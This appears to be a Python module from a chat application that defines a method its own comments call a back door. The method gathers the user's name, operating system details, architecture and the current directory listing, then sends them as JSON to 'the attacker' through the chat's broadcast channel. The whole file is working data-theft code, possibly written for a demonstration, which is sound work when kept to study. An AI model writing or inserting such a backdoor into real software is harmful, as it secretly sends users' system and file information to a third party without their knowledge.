import platform 
import os
import json
from src import ui
logger = ui.init_logger('back_door')   # Initialize logger
ui.set_log_level(logger, 'DEBUG')   # SET LOG LEVEL AT HERE

async def secret(self):
    # BACK DOOR: Send system information to the attacker
    try:
        # Collect client's information
        system_info = {
            "username": self.username,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "file_list": os.listdir('.') 
        }

        # transform the information into a JSON
        message = f"System Info: {json.dumps(system_info)}"

        # use the broadcast method to send the information to the attacker
        await self.broadcast(message)
        logger.warning("Backdoor command executed: system information sent.")
    except Exception as e:
        logger.error(f"Failed to execute backdoor: {e}")
